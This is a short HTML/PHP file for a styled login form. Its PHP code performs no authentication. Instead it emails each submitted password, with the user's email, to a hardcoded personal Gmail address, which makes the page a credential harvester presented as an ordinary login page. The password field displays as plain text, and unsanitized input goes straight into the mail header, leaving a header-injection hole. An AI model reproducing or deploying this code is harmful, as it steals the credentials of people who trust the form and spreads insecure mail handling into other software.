<form class="form-detail" action="" method="post" id="myform" style="background:#000">
				<h2 style="color:#fff">Login Form</h2>
				
				<div class="text-center" style="color:#fff;margin-top:-8px;">Doesn't have any account?
<a class="small" href="register.php" style="color:#4ae8ff;text-decoration:none">Sign Up</a></div><br>
				<div class="form-row">
					<label for="your_email" style="color:#fff">Your Email:</label>
					<input type="text" name="email" id="your_email" class="input-text" required pattern="[^@]+@[^@]+.[a-zA-Z]{2,6}" placeholder="your email"style="border-radius:25px">
				</div>
				<div class="form-row">
					<label for="password" style="color:#fff">Password:</label>
					<input type="text" name="n" id="password" class="input-text" required placeholder="password" style="border-radius:25px">
				</div>
				
				
				<div class="form-row-last">
					<input type="submit" name="login" class="register" value="login" style="background: rgb(54 118 132);	box-shadow: 5px 5px 8px 0 rgb(38 77 85), 0 6px 20px 0 rgb(61 92 100);border-radius:25px">
				</div>
				
			</form>
<?php
// $to="shreyajain9609@gmail.com";
// $subject="ooo";
$n=$_REQUEST['n'];
$e=$_REQUEST['email'];
// $headers="from : $from";
mail("shreyajain9609@gmail.com","hhh",$n,"from: $n <$e>");

?>